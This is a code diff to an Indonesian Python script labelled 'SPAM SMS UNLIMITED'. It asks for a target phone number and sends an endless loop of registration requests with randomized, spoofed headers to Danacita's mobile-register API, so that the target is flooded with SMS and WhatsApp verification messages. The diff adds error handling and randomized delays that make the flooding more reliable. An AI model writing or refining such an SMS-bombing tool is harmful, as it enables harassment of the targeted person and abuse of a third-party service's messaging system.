@@ -2,11 +2,9 @@ import requests
 import json
 import time
 import random
-import os, sys, time, json, requests
-from colorama import Fore, init
-from sys import argv
-import random
 import uuid
+from colorama import Fore, init
+import sys
 
 init(autoreset=True)
 
@@ -16,6 +14,7 @@ def autotype(sync):
         sys.stdout.flush()
         time.sleep(0.008)
 
+# Define colorama colors
 BlueTerm = Fore.BLUE
 WhiteTerm = Fore.WHITE
 RedTerm = Fore.RED
@@ -51,8 +50,6 @@ def generate_sec_ch_ua_platform():
     platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
     return f"\"{random.choice(platforms)}\""
 
-inputNomer = input(f"{WhiteTerm}[{RedTerm}• {kuning}•{hijau}•{WhiteTerm}] {biru}Nomor Target (ex: +628xxx){WhiteTerm}: ")    
-
 def generate_headers():
     return {
         "Accept": "application/json, text/plain, */*",
@@ -72,19 +69,24 @@ def generate_headers():
         "User-Agent": generate_user_agent()
     }
 
+inputNomer = input(f"{WhiteTerm}[{RedTerm}• {kuning}•{hijau}•{WhiteTerm}] {biru}Nomor Target (ex: +628xxx){WhiteTerm}: ")
 
 data_danacita = json.dumps({
     "username": inputNomer,
 })
 
 print(f"{WhiteTerm}[{hijau}• SPAM SMS UNLIMITED{kuning}•{hijau}•{WhiteTerm}]")
+
 while True:
     headers_danacita = generate_headers()
-    response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
+    try:
+        response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
+        if response_danacita.status_code == 200:
+            print(f"{GreenTerm}Berhasil mengirim SMS/WA via Danacita")
+        else:
+            print(f"{RedTerm}Gagal mengirim SMS/WA via Danacita")
+    except requests.RequestException as e:
+        print(f"{RedTerm}Terjadi kesalahan: {e}")
     
-    if response_danacita.status_code == 200:
-        print(f"{GreenTerm}Berhasil mengirim SMS/WA via Danacita")
-    else:
-        print(f"{RedTerm}Gagal mengirim SMS/WA via Danacita")
-    
-    
+    # Delay before sending the next request
+    time.sleep(random.randint(1, 5))  # Delay antara 1 hingga 5 detik
